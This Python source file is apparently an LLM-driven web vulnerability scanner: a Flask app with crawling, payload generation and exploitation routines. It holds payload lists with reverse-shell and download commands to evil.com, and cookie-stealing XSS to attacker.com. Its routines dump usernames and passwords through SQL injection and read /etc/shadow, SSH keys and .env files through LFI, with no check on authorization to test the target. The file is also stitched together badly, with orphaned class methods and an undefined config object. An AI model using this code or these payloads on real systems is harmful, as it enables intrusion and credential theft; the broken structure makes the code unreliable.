#!/usr/bin/env python3
"""
Enhanced LLM-Powered Vulnerability Scanner
==========================================

A sophisticated web vulnerability scanner that leverages Large Language Models (LLMs)
to generate intelligent attack payloads and perform comprehensive security testing.
"""

import os
import sys
import json
import time
import logging
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Any, Union
from dataclasses import dataclass, asdict
from enum import Enum

from flask import Flask, render_template, request, jsonify, session
from flask_cors import CORS
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import requests
from bs4 import BeautifulSoup
import urllib.parse
import sqlite3
import threading
import asyncio
from concurrent.futures import ThreadPoolExecutor, as_completed
import google.generativeai as genai

# Add project root to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# Import modular components
from core.scanner import VulnerabilityScanner
from core.database import DatabaseManager
from core.llm_manager import LLMManager
from core.config import ConfigManager
from core.security import SecurityManager
from core.monitoring import MonitoringManager
from core.payload_manager import PayloadManager

# Initialize Flask app
app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'dev-secret-key-change-in-production')
CORS(app)

# Initialize rate limiter
limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=["200 per day", "50 per hour"]
)

# Initialize core components
db_manager = DatabaseManager()
config_manager = ConfigManager()
security_manager = SecurityManager()
monitoring_manager = MonitoringManager()
llm_manager = LLMManager()
payload_manager = PayloadManager()

# Initialize global scanner instance
scanner = VulnerabilityScanner(llm_manager, db_manager, monitoring_manager)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('scanner.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Import the new modular scanner class
from core.scanner import VulnerabilityScanner

# Initialize Flask routes
@app.route('/')
def index():
    """Main web interface"""
    return render_template('index.html')

@app.route('/api/config', methods=['GET', 'POST'])
def handle_config():
    """Handle scanner configuration"""
    if request.method == 'GET':
        # Return current configuration
        return jsonify({
            'target_url': session.get('target_url', ''),
            'available_models': llm_manager.detect_local_models(),
            'security_status': security_manager.get_security_status()
        })

    # Handle POST request
    data = request.get_json()
    if not data:
        return jsonify({'error': 'Invalid JSON data'}), 400

    # Validate input
    is_valid, errors = security_manager.validate_input(data)
    if not is_valid:
        return jsonify({'error': 'Input validation failed', 'details': errors}), 400

    target_url = data.get('target_url')
    if not target_url:
        return jsonify({'error': 'Target URL is required'}), 400

    # Validate target URL
    if not security_manager._validate_url(target_url):
        return jsonify({'error': 'Invalid target URL'}), 400

    # Store configuration in session
    session['target_url'] = target_url

    # Create scan session
    scan_session_id = db_manager.create_scan_session(target_url)

    # Generate CSRF token
    csrf_token = security_manager.generate_csrf_token(session.sid)

    logger.info(f"Configuration updated for target: {target_url}")
    return jsonify({
        'status': 'configured',
        'session_id': scan_session_id,
        'csrf_token': csrf_token
    })

@app.route('/api/models', methods=['GET'])
def get_available_models():
    """Get available LLM models"""
    try:
        models = llm_manager.detect_local_models()
        return jsonify({
            'models': [
                {
                    'name': name,
                    'provider': model.provider.value,
                    'is_available': model.is_available,
                    'capabilities': model.capabilities
                }
                for name, model in models.items()
            ]
        })
    except Exception as e:
        logger.error(f"Error detecting models: {e}")
        return jsonify({'error': 'Failed to detect models'}), 500

@app.route('/api/discover_urls', methods=['POST'])
def discover_urls():
    """Discover URLs from target website"""
    if 'target_url' not in session:
        return jsonify({'error': 'No target configured'}), 400

    target_url = session['target_url']
    scan_session_id = session.get('scan_session_id')

    try:
        # Start scan session if not exists
        if not scan_session_id:
            scan_session_id = db_manager.create_scan_session(target_url)
            session['scan_session_id'] = scan_session_id

        # Discover URLs using scanner
        urls = scanner.discover_urls(target_url)

        # Store discovered URLs in database
        for url in urls:
            db_manager.save_scan_result({
                'target_url': url,
                'vulnerability_type': 'URL_DISCOVERY',
                'payload': 'GET',
                'response_code': 200,
                'is_vulnerable': False,
                'confidence_score': 1.0,
                'severity': 'INFO'
            }, scan_session_id)

        return jsonify({'urls': urls, 'count': len(urls)})

    except Exception as e:
        logger.error(f"Error discovering URLs: {e}")
        return jsonify({'error': 'Failed to discover URLs'}), 500

@app.route('/api/scan', methods=['POST'])
def start_scan():
    """Start vulnerability scan"""
    if 'target_url' not in session:
        return jsonify({'error': 'No target configured'}), 400

    data = request.get_json()
    if not data:
        return jsonify({'error': 'Invalid JSON data'}), 400

    # Validate CSRF token
    csrf_token = data.get('csrf_token')
    if not security_manager.validate_csrf_token(csrf_token):
        return jsonify({'error': 'Invalid CSRF token'}), 403

    # Get scan configuration
    scan_types = data.get('scan_types', ['sql_injection', 'xss', 'lfi', 'command_injection', 'xxe'])
    target_url = session['target_url']
    scan_session_id = session.get('scan_session_id')

    try:
        # Start monitoring
        monitoring_manager.start_scan_monitoring(scan_session_id, target_url)

        # Run scan in background thread
        def run_scan():
            try:
                results = scanner.run_comprehensive_scan(target_url, scan_types, scan_session_id)
                monitoring_manager.end_scan_monitoring(scan_session_id)

                # Store results
                for result in results:
                    db_manager.save_scan_result(result, scan_session_id)

                logger.info(f"Scan completed for {target_url}, found {len(results)} results")

            except Exception as e:
                logger.error(f"Scan failed for {target_url}: {e}")
                monitoring_manager.log_security_event(
                    'scan_error',
                    {'target_url': target_url, 'error': str(e)},
                    severity='HIGH'
                )

        import threading
        scan_thread = threading.Thread(target=run_scan, daemon=True)
        scan_thread.start()

        return jsonify({
            'status': 'started',
            'session_id': scan_session_id,
            'message': f'Scan started for {target_url}'
        })

    except Exception as e:
        logger.error(f"Error starting scan: {e}")
        return jsonify({'error': 'Failed to start scan'}), 500

@app.route('/api/results', methods=['GET'])
def get_results():
    """Get scan results"""
    target_url = session.get('target_url')
    if not target_url:
        return jsonify({'results': []})

    scan_session_id = request.args.get('session_id')
    limit = int(request.args.get('limit', 100))
    offset = int(request.args.get('offset', 0))

    filters = {}
    if scan_session_id:
        filters['scan_session_id'] = scan_session_id

    # Add target domain filter
    from urllib.parse import urlparse
    parsed = urlparse(target_url)
    target_domain = f"{parsed.scheme}://{parsed.netloc}"
    filters['target_domain'] = target_domain

    # Get results from database
    results = db_manager.get_scan_results(filters, limit, offset)

    # Format results for frontend
    formatted_results = []
    for result in results:
        formatted_results.append({
            'id': result['id'],
            'timestamp': result['timestamp'],
            'target_url': result['target_url'],
            'vulnerability_type': result['vulnerability_type'],
            'payload': security_manager.sanitize_payload(result['payload']),
            'response_code': result['response_code'],
            'response_content': result['response_content'][:200] + '...' if result['response_content'] and len(result['response_content']) > 200 else result['response_content'],
            'is_vulnerable': result['is_vulnerable'],
            'confidence_score': result['confidence_score'],
            'data_extracted': result['data_extracted'],
            'extracted_data': result.get('extracted_data'),
            'severity': result['severity'],
            'risk_score': result.get('risk_score', 0.0)
        })

    return jsonify({
        'results': formatted_results,
        'target_domain': target_domain,
        'total_count': len(results)
    })

@app.route('/api/status', methods=['GET'])
def get_status():
    """Get scanner status"""
    return jsonify({
        'system_health': monitoring_manager.get_system_health(),
        'scan_statistics': monitoring_manager.get_scan_statistics(),
        'security_status': security_manager.get_security_status(),
        'available_models': len(llm_manager.detect_local_models())
    })

@app.route('/api/export', methods=['POST'])
def export_results():
    """Export scan results"""
    data = request.get_json()
    if not data:
        return jsonify({'error': 'Invalid JSON data'}), 400

    format_type = data.get('format', 'json')
    scan_session_id = data.get('session_id')

    if not scan_session_id:
        return jsonify({'error': 'Session ID required'}), 400

    # Get results for session
    results = db_manager.get_scan_results({'scan_session_id': scan_session_id})

    if format_type == 'json':
        return jsonify({'results': results})
    else:
        return jsonify({'error': 'Unsupported export format'}), 400

@app.route('/api/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    return jsonify({
        'status': 'healthy',
        'timestamp': time.time(),
        'system_health': monitoring_manager.get_system_health(),
        'database_status': 'connected' if db_manager else 'disconnected',
        'models_available': len(llm_manager.detect_local_models()) > 0
    })

@app.errorhandler(429)
def ratelimit_handler(e):
    """Handle rate limit exceeded"""
    return jsonify({'error': 'Rate limit exceeded'}), 429

@app.errorhandler(500)
def internal_error(e):
    """Handle internal server errors"""
    logger.error(f"Internal server error: {e}")
    return jsonify({'error': 'Internal server error'}), 500

if __name__ == '__main__':
    # Validate configuration
    errors = config.validate()
    if errors:
        logger.error("Configuration errors:")
        for error in errors:
            logger.error(f"  - {error}")
        sys.exit(1)

    # Initialize database
    db_manager.init_database()

    # Start the application
    logger.info(f"Starting scanner on {config.get('host')}:{config.get('port')}")
    app.run(
        host=config.get('host'),
        port=config.get('port'),
        debug=config.get('debug')
    )
        
    def configure_llm(self, api_key=None, ollama_model=None, use_ollama=False):
        self.api_key = api_key
        self.ollama_model = ollama_model
        self.use_ollama = use_ollama
        
        if not use_ollama and api_key:
            genai.configure(api_key=api_key)
            self.llm_model = genai.GenerativeModel('gemini-2.0-flash-exp')
    
    def discover_urls(self, base_url, max_depth=3):
        """Discover internal URLs from the target website with deep exploration"""
        discovered = set()
        to_crawl = [(base_url, 0)]
        crawled = set()
        
        # Common endpoint patterns to try
        common_endpoints = [
            '/admin', '/admin.php', '/administrator', '/wp-admin', '/login', '/login.php',
            '/api', '/api/v1', '/api/v2', '/rest', '/graphql', '/swagger',
            '/config', '/config.php', '/database.php', '/db.php', '/connect.php',
            '/test', '/test.php', '/debug', '/debug.php', '/info.php', '/phpinfo.php',
            '/upload', '/uploads', '/files', '/images', '/assets', '/static',
            '/backup', '/backups', '/logs', '/log', '/tmp', '/temp',
            '/user', '/users', '/profile', '/account', '/settings',
            '/search', '/contact', '/about', '/help', '/faq',
            '/.env', '/.git', '/robots.txt', '/sitemap.xml', '/composer.json'
        ]
        
        # Add common endpoints to discovery
        base_parsed = urlparse(base_url)
        for endpoint in common_endpoints:
            test_url = f"{base_parsed.scheme}://{base_parsed.netloc}{endpoint}"
            to_crawl.append((test_url, 0))
        
        while to_crawl:
            url, depth = to_crawl.pop(0)
            if url in crawled or depth > max_depth:
                continue
                
            crawled.add(url)
            try:
                response = self.session.get(url, timeout=10)
                
                # Even if page returns 404, it might still be worth testing for vulnerabilities
                if response.status_code in [200, 301, 302, 403, 500]:
                    discovered.add(url)
                
                if response.status_code == 200:
                    soup = BeautifulSoup(response.content, 'html.parser')
                    
                    # Find all links
                    for link in soup.find_all(['a'], href=True):
                        href = link.get('href')
                        if href:
                            full_url = urljoin(url, href)
                            parsed = urlparse(full_url)
                            
                            # Only include internal URLs
                            if parsed.netloc == base_parsed.netloc:
                                discovered.add(full_url)
                                if depth < max_depth:
                                    to_crawl.append((full_url, depth + 1))
                    
                    # Find forms and their actions
                    for form in soup.find_all('form'):
                        action = form.get('action', '')
                        method = form.get('method', 'GET').upper()
                        
                        if action:
                            form_url = urljoin(url, action)
                            discovered.add(form_url)
                            
                            # Extract form parameters for later testing
                            form_params = []
                            for input_field in form.find_all(['input', 'textarea', 'select']):
                                param_name = input_field.get('name')
                                if param_name:
                                    form_params.append(param_name)
                            
                            # Store form info for vulnerability testing
                            if not hasattr(self, 'discovered_forms'):
                                self.discovered_forms = {}
                            self.discovered_forms[form_url] = {
                                'method': method,
                                'parameters': form_params
                            }
                    
                    # Look for JavaScript files that might contain API endpoints
                    for script in soup.find_all('script', src=True):
                        script_url = urljoin(url, script['src'])
                        if base_parsed.netloc in script_url:
                            discovered.add(script_url)
                            
                            # Try to extract API endpoints from JavaScript
                            try:
                                js_response = self.session.get(script_url, timeout=5)
                                js_content = js_response.text
                                
                                # Look for API endpoint patterns
                                import re
                                api_patterns = [
                                    r'["\']/(api/[^"\']+)["\']',
                                    r'["\']/(rest/[^"\']+)["\']',
                                    r'["\']/(v\d+/[^"\']+)["\']',
                                    r'fetch\(["\']([^"\']+)["\']',
                                    r'ajax\(["\']([^"\']+)["\']'
                                ]
                                
                                for pattern in api_patterns:
                                    matches = re.findall(pattern, js_content)
                                    for match in matches:
                                        api_url = urljoin(base_url, match)
                                        if base_parsed.netloc in api_url:
                                            discovered.add(api_url)
                            except:
                                pass
                    
                    # Look for CSS files that might reference additional resources
                    for css_link in soup.find_all('link', rel='stylesheet'):
                        css_url = css_link.get('href')
                        if css_url:
                            full_css_url = urljoin(url, css_url)
                            if base_parsed.netloc in full_css_url:
                                discovered.add(full_css_url)
                
            except Exception as e:
                print(f"Error crawling {url}: {e}")
        
        # Filter out duplicates and clean URLs
        clean_discovered = set()
        for url in discovered:
            # Remove fragments and normalize
            parsed = urlparse(url)
            clean_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            if parsed.query:
                clean_url += f"?{parsed.query}"
            clean_discovered.add(clean_url)
        
        self.discovered_urls = clean_discovered
        print(f"[INFO] Discovered {len(clean_discovered)} URLs for testing")
        return list(clean_discovered)
    
    def generate_llm_payloads(self, vulnerability_type, target_url, context=""):
        """Generate sophisticated payloads using LLM"""
        if self.use_ollama and self.ollama_model:
            return self._generate_ollama_payloads(vulnerability_type, target_url, context)
        elif self.llm_model and self.api_key:
            return self._generate_gemini_payloads(vulnerability_type, target_url, context)
        else:
            return self._get_default_payloads(vulnerability_type)
    
    def _generate_gemini_payloads(self, vulnerability_type, target_url, context):
        """Generate payloads using Gemini"""
        try:
            prompt = f"""
            Generate 10 sophisticated {vulnerability_type} payloads for testing the URL: {target_url}
            Context: {context}
            
            Requirements:
            1. Include both basic and advanced payloads
            2. Consider different encoding methods (URL, HTML, Unicode, etc.)
            3. Include bypass techniques for common filters
            4. Make payloads specific to the vulnerability type
            5. Include payloads that test for different scenarios
            
            Return only the payloads, one per line, without explanations.
            """
            
            response = self.llm_model.generate_content(prompt)
            payloads = [p.strip() for p in response.text.split('\n') if p.strip()]
            return payloads[:10]  # Limit to 10 payloads
            
        except Exception as e:
            print(f"Error generating Gemini payloads: {e}")
            return self._get_default_payloads(vulnerability_type)
    
    def _generate_ollama_payloads(self, vulnerability_type, target_url, context):
        """Generate payloads using Ollama"""
        try:
            prompt = f"""Generate 10 {vulnerability_type} payloads for {target_url}. Context: {context}"""
            
            response = requests.post('http://localhost:11434/api/generate', 
                                   json={
                                       'model': self.ollama_model,
                                       'prompt': prompt,
                                       'stream': False
                                   })
            
            if response.status_code == 200:
                result = response.json()
                payloads = [p.strip() for p in result['response'].split('\n') if p.strip()]
                return payloads[:10]
            else:
                return self._get_default_payloads(vulnerability_type)
                
        except Exception as e:
            print(f"Error generating Ollama payloads: {e}")
            return self._get_default_payloads(vulnerability_type)
    
    def _get_default_payloads(self, vulnerability_type):
        """Default payloads for different vulnerability types"""
        payloads = {
            'sql_injection': [
                "' OR '1'='1",
                "'; DROP TABLE users; --",
                "' UNION SELECT NULL,NULL,NULL--",
                "admin'--",
                "' OR 1=1#",
                "') OR ('1'='1",
                "' WAITFOR DELAY '0:0:5'--",
                "'; EXEC xp_cmdshell('dir'); --",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                "' OR SLEEP(5)--"
            ],
            'xss': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>",
                "'\"><script>alert('XSS')</script>",
                "<iframe src=javascript:alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<script>document.location='http://evil.com/'+document.cookie</script>",
                "<%2Fscript%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
                "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>"
            ],
            'lfi': [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",
                "php://filter/read=convert.base64-encode/resource=index.php",
                "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
                "/proc/self/environ",
                "expect://id",
                "file:///etc/passwd"
            ],
            'command_injection': [
                "; ls -la",
                "| whoami",
                "& dir",
                "; cat /etc/passwd",
                "| id",
                "; wget http://evil.com/shell.php",
                "`whoami`",
                "$(id)",
                "; nc -e /bin/sh evil.com 4444",
                "| curl http://evil.com/$(whoami)"
            ],
            'xxe': [
                '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><root>&test;</root>',
                '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd"> %xxe;]>',
                '<?xml version="1.0"?><!DOCTYPE data SYSTEM "http://evil.com/evil.dtd"><data>&send;</data>',
                '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>'
            ]
        }
        return payloads.get(vulnerability_type, [])
    
    def test_sql_injection(self, url, params=None):
        """Test for SQL injection vulnerabilities with deep exploitation"""
        payloads = self.generate_llm_payloads('sql_injection', url)
        results = []
        
        # First, test basic payloads
        for payload in payloads:
            try:
                # Test different parameter positions
                param_names = ['id', 'user', 'search', 'q', 'name', 'email', 'test', 'page']
                
                for param in param_names:
                    if '?' in url:
                        test_url = f"{url}&{param}={urllib.parse.quote(payload)}"
                    else:
                        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                    
                    response = self.session.get(test_url, timeout=15)
                    
                    # Check for SQL error messages
                    sql_errors = [
                        'mysql_fetch_array', 'ORA-01756', 'Microsoft OLE DB Provider',
                        'SQLServer JDBC Driver', 'PostgreSQL query failed',
                        'supplied argument is not a valid MySQL', 'mysql_num_rows',
                        'Error Occurred While Processing Request', 'Server Error',
                        'Microsoft JET Database', 'Error converting data type',
                        'Invalid column name', 'ORA-00921', 'quoted string not properly terminated',
                        'syntax error', 'mysql_error', 'warning: mysql_', 'function.mysql',
                        'MySQL result index', 'Warning: mysql_fetch_array',
                        'valid MySQL result', 'MySqlClient.', 'com.mysql.jdbc',
                        'Zend_Db_Statement_Mysqli_Exception', 'Pdo\\Exception',
                        'SQLite/JDBCDriver', 'SQLite.Exception', 'System.Data.SQLite.SQLiteException',
                        'Warning: sqlite_', 'function.sqlite', 'SQLiteDatabase'
                    ]
                    
                    is_vulnerable = any(error.lower() in response.text.lower() for error in sql_errors)
                    
                    # If vulnerable, try to extract data
                    extracted_data = None
                    data_extracted = False
                    
                    if is_vulnerable:
                        print(f"[VULN FOUND] SQL Injection detected at {test_url}")
                        extracted_data, data_extracted = self._exploit_sql_injection(test_url, param)
                    
                    confidence = 0.9 if data_extracted else (0.8 if is_vulnerable else 0.1)
                    
                    result = {
                        'url': test_url,
                        'vulnerability_type': 'SQL Injection',
                        'payload': payload,
                        'response_code': response.status_code,
                        'response_content': response.text[:1000],
                        'is_vulnerable': is_vulnerable,
                        'confidence_score': confidence,
                        'timestamp': datetime.now().isoformat(),
                        'data_extracted': data_extracted,
                        'extracted_data': extracted_data,
                        'severity': 'CRITICAL' if data_extracted else ('HIGH' if is_vulnerable else 'LOW')
                    }
                    
                    results.append(result)
                    self._save_result(result)
                    
                    if data_extracted:
                        break  # Found critical vulnerability, stop testing this URL
                    
                    time.sleep(random.uniform(0.5, 1.5))
                
            except Exception as e:
                print(f"Error testing SQL injection on {url}: {e}")
                
        return results
    
    def _exploit_sql_injection(self, vulnerable_url, param):
        """Attempt to extract data from SQL injection vulnerability"""
        try:
            print(f"[EXPLOIT] Attempting data extraction from {vulnerable_url}")
            
            # Parse URL to get base and existing params
            from urllib.parse import urlparse, parse_qs, urlencode
            parsed = urlparse(vulnerable_url)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            
            # Database detection payloads
            db_detection_payloads = [
                f"{param}=1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                f"{param}=1' AND (SELECT COUNT(*) FROM mysql.user)>0--",
                f"{param}=1' AND (SELECT COUNT(*) FROM pg_database)>0--",
                f"{param}=1' AND (SELECT COUNT(*) FROM sqlite_master)>0--"
            ]
            
            database_type = None
            for db_payload in db_detection_payloads:
                test_url = f"{base_url}?{db_payload}"
                response = self.session.get(test_url, timeout=10)
                
                if 'information_schema' in db_payload and len(response.text) > 100:
                    database_type = 'MySQL'
                    break
                elif 'pg_database' in db_payload and len(response.text) > 100:
                    database_type = 'PostgreSQL'
                    break
                elif 'sqlite_master' in db_payload and len(response.text) > 100:
                    database_type = 'SQLite'
                    break
            
            extracted_data = {'database_type': database_type}
            
            if database_type == 'MySQL':
                # Try to extract database names
                db_names_payload = f"{param}=1' UNION SELECT GROUP_CONCAT(schema_name),2,3 FROM information_schema.schemata--"
                test_url = f"{base_url}?{db_names_payload}"
                response = self.session.get(test_url, timeout=10)
                
                # Look for database names in response
                if response.status_code == 200 and len(response.text) > 100:
                    extracted_data['databases'] = self._extract_data_from_response(response.text)
                
                # Try to extract table names
                tables_payload = f"{param}=1' UNION SELECT GROUP_CONCAT(table_name),2,3 FROM information_schema.tables WHERE table_schema=database()--"
                test_url = f"{base_url}?{tables_payload}"
                response = self.session.get(test_url, timeout=10)
                
                if response.status_code == 200 and len(response.text) > 100:
                    extracted_data['tables'] = self._extract_data_from_response(response.text)
                
                # Try to extract user data (common table names)
                user_tables = ['users', 'user', 'accounts', 'admin', 'members']
                for table in user_tables:
                    user_payload = f"{param}=1' UNION SELECT GROUP_CONCAT(CONCAT(username,':',password)),2,3 FROM {table}--"
                    test_url = f"{base_url}?{user_payload}"
                    response = self.session.get(test_url, timeout=10)
                    
                    if response.status_code == 200 and ':' in response.text:
                        extracted_data['user_data'] = self._extract_data_from_response(response.text)
                        break
            
            # Check if we extracted any meaningful data
            data_extracted = any(key != 'database_type' and extracted_data.get(key) 
                               for key in extracted_data.keys())
            
            if data_extracted:
                print(f"[CRITICAL] Data extraction successful: {extracted_data}")
            
            return extracted_data, data_extracted
            
        except Exception as e:
            print(f"[ERROR] SQL exploitation failed: {e}")
            return None, False
    
    def _extract_data_from_response(self, response_text):
        """Extract meaningful data from SQL injection response"""
        import re
        
        # Look for patterns that might be extracted data
        patterns = [
            r'([a-zA-Z_][a-zA-Z0-9_]*(?:,[a-zA-Z_][a-zA-Z0-9_]*)+)',  # Comma-separated values
            r'([a-zA-Z0-9_]+:[a-zA-Z0-9$./]+)',  # Username:password patterns
            r'([a-zA-Z_][a-zA-Z0-9_]*\s*[:|=]\s*[a-zA-Z0-9@._-]+)',  # Key-value pairs
        ]
        
        extracted = []
        for pattern in patterns:
            matches = re.findall(pattern, response_text)
            if matches:
                extracted.extend(matches[:5])  # Limit to first 5 matches
        
        return extracted[:10] if extracted else None  # Return first 10 items
    
    def test_xss(self, url, params=None):
        """Test for XSS vulnerabilities"""
        payloads = self.generate_llm_payloads('xss', url)
        results = []
        
        for payload in payloads:
            try:
                # Test GET parameters
                if '?' in url:
                    test_url = url + '&xss_test=' + urllib.parse.quote(payload)
                else:
                    test_url = url + '?xss_test=' + urllib.parse.quote(payload)
                
                response = self.session.get(test_url, timeout=10)
                
                # Check if payload is reflected in response
                is_vulnerable = payload in response.text or urllib.parse.unquote(payload) in response.text
                confidence = 0.9 if is_vulnerable else 0.1
                
                # If vulnerable, try to extract more information
                extracted_data = None
                data_extracted = False
                
                if is_vulnerable:
                    print(f"[VULN FOUND] XSS detected at {test_url}")
                    extracted_data, data_extracted = self._exploit_xss(test_url, 'xss_test', payload)
                
                confidence = 0.95 if data_extracted else (0.9 if is_vulnerable else 0.1)
                
                result = {
                    'url': test_url,
                    'vulnerability_type': 'XSS',
                    'payload': payload,
                    'response_code': response.status_code,
                    'response_content': response.text[:1000],
                    'is_vulnerable': is_vulnerable,
                    'confidence_score': confidence,
                    'timestamp': datetime.now().isoformat(),
                    'data_extracted': data_extracted,
                    'extracted_data': extracted_data,
                    'severity': 'CRITICAL' if data_extracted else ('HIGH' if is_vulnerable else 'LOW')
                }
                
                results.append(result)
                self._save_result(result)
                
                time.sleep(random.uniform(0.5, 1.5))
                
            except Exception as e:
                print(f"Error testing XSS on {url}: {e}")
                
        return results
    
    def _exploit_xss(self, vulnerable_url, param, original_payload):
        """Attempt to exploit XSS vulnerability for information gathering"""
        try:
            print(f"[EXPLOIT] Attempting XSS exploitation on {vulnerable_url}")
            
            # Advanced XSS payloads for information extraction
            exploitation_payloads = [
                # Cookie extraction
                f"<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>",
                f"<img src=x onerror=this.src='http://attacker.com/steal?cookie='+document.cookie>",
                
                # DOM information extraction
                f"<script>alert('XSS: '+document.domain+' | '+document.cookie.substring(0,50))</script>",
                f"<script>document.body.innerHTML+='<div>DOMAIN:'+document.domain+'</div>'</script>",
                
                # Local storage extraction
                f"<script>alert('LocalStorage: '+JSON.stringify(localStorage))</script>",
                
                # Session information
                f"<script>alert('Session: '+document.cookie+' | URL: '+document.URL)</script>",
                
                # Form data extraction
                f"<script>var forms=document.forms;for(var i=0;i<forms.length;i++){{alert('Form'+i+': '+forms[i].innerHTML)}}</script>"
            ]
            
            extracted_info = {}
            
            for exploit_payload in exploitation_payloads:
                try:
                    # Parse URL to inject payload
                    from urllib.parse import urlparse, parse_qs, urlencode
                    parsed = urlparse(vulnerable_url)
                    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    
                    test_url = f"{base_url}?{param}={urllib.parse.quote(exploit_payload)}"
                    response = self.session.get(test_url, timeout=10)
                    
                    # Check if the payload executed (look for reflected content)
                    if exploit_payload in response.text or urllib.parse.unquote(exploit_payload) in response.text:
                        # Extract information from the response
                        if 'document.domain' in exploit_payload:
                            # Look for domain information in response
                            domain_match = re.search(r'DOMAIN:([^<]+)', response.text)
                            if domain_match:
                                extracted_info['domain'] = domain_match.group(1)
                        
                        if 'document.cookie' in exploit_payload:
                            # Look for cookie information
                            cookie_match = re.search(r'cookie=([^&\s<]+)', response.text)
                            if cookie_match:
                                extracted_info['cookies'] = cookie_match.group(1)
                        
                        if 'localStorage' in exploit_payload:
                            # Look for localStorage data
                            storage_match = re.search(r'LocalStorage:\s*({[^}]*})', response.text)
                            if storage_match:
                                extracted_info['local_storage'] = storage_match.group(1)
                        
                        if 'forms' in exploit_payload:
                            # Look for form information
                            form_matches = re.findall(r'Form\d+:\s*([^<]+)', response.text)
                            if form_matches:
                                extracted_info['forms'] = form_matches
                        
                        # Check if payload is actually executing (not just reflected)
                        execution_indicators = [
                            '<script>', '</script>', 'onerror=', 'onload=',
                            'javascript:', 'alert(', 'document.'
                        ]
                        
                        if any(indicator in response.text for indicator in execution_indicators):
                            extracted_info['payload_executed'] = True
                            extracted_info['execution_context'] = response.text[:200]
                    
                    time.sleep(0.5)  # Small delay between exploitation attempts
                    
                except Exception as e:
                    continue  # Try next payload
            
            data_extracted = len(extracted_info) > 0 and extracted_info.get('payload_executed', False)
            
            if data_extracted:
                print(f"[CRITICAL] XSS exploitation successful: {extracted_info}")
            
            return extracted_info, data_extracted
            
        except Exception as e:
            print(f"[ERROR] XSS exploitation failed: {e}")
            return None, False
    
    def test_lfi(self, url, params=None):
        """Test for Local File Inclusion vulnerabilities with deep file system exploration"""
        payloads = self.generate_llm_payloads('lfi', url)
        results = []
        
        for payload in payloads:
            try:
                # Test different parameter names
                param_names = ['file', 'page', 'include', 'path', 'doc', 'url', 'template', 'view', 'load', 'read']
                
                for param in param_names:
                    if '?' in url:
                        test_url = f"{url}&{param}={urllib.parse.quote(payload)}"
                    else:
                        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                    
                    response = self.session.get(test_url, timeout=15)
                    
                    # Check for file inclusion indicators
                    lfi_indicators = [
                        'root:x:', '/bin/bash', 'daemon:x:', 'www-data:x:',
                        '[boot loader]', '[operating systems]', 'Windows Registry Editor',
                        '# /etc/passwd', 'nobody:x:', 'mail:x:', 'ftp:x:',
                        'Windows IP Configuration', 'Volume Serial Number'
                    ]
                    
                    is_vulnerable = any(indicator in response.text for indicator in lfi_indicators)
                    
                    # If vulnerable, try to extract more files
                    extracted_files = None
                    data_extracted = False
                    
                    if is_vulnerable:
                        print(f"[VULN FOUND] LFI detected at {test_url}")
                        extracted_files, data_extracted = self._exploit_lfi(url, param)
                    
                    confidence = 0.95 if data_extracted else (0.9 if is_vulnerable else 0.1)
                    
                    result = {
                        'url': test_url,
                        'vulnerability_type': 'LFI',
                        'payload': payload,
                        'response_code': response.status_code,
                        'response_content': response.text[:1000],
                        'is_vulnerable': is_vulnerable,
                        'confidence_score': confidence,
                        'timestamp': datetime.now().isoformat(),
                        'data_extracted': data_extracted,
                        'extracted_data': extracted_files,
                        'severity': 'CRITICAL' if data_extracted else ('HIGH' if is_vulnerable else 'LOW')
                    }
                    
                    results.append(result)
                    self._save_result(result)
                    
                    if data_extracted:
                        break  # Found critical vulnerability
                    
                    time.sleep(random.uniform(0.3, 0.8))
                
            except Exception as e:
                print(f"Error testing LFI on {url}: {e}")
                
        return results
    
    def _exploit_lfi(self, base_url, param):
        """Attempt to extract sensitive files through LFI"""
        try:
            print(f"[EXPLOIT] Attempting file extraction from LFI")
            
            # List of sensitive files to try
            sensitive_files = [
                # Linux/Unix files
                '../../../etc/passwd',
                '../../../etc/shadow',
                '../../../etc/hosts',
                '../../../etc/apache2/apache2.conf',
                '../../../etc/nginx/nginx.conf',
                '../../../var/log/apache2/access.log',
                '../../../var/log/nginx/access.log',
                '../../../home/user/.ssh/id_rsa',
                '../../../root/.bash_history',
                '../../../etc/mysql/my.cnf',
                
                # Windows files
                '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                '..\\..\\..\\windows\\win.ini',
                '..\\..\\..\\windows\\system.ini',
                '..\\..\\..\\inetpub\\wwwroot\\web.config',
                
                # Application files
                '../../../var/www/html/config.php',
                '../../../var/www/html/.env',
